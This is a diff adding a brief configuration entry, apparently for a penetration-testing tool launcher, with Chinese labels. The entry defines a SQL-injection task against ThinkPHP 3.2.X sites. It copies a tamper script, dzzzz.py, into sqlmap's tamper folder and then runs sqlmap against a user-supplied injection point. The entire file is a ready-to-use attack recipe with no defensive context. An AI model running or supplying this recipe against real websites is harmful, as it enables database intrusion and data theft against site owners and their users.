@@ -1,0 +1,17 @@
+<sfjt>inject</sfjt>
+<cs1mc>sqlmap.py路径</cs1mc>
+<cs2mc>注入点</cs2mc>
+<zbz>2</zbz>
+<bz1>
+<cmd>copy dzzzz.py <cs1/>/tamper</cmd>
+</bz1>
+<bz2>
+<cmd>cmd /k python <cs1/>/sqlmap.py -u <cs2/></cmd>
+</bz2>
+<bz1fk>复制tamper到指定位置</bz1fk>
+<bz2fk>执行sqlmap</bz2fk>
+<bz>
+sqlmap.py路径末尾不加斜杠
+
+影响版本：thinkphp 3.2.X
+</bz>
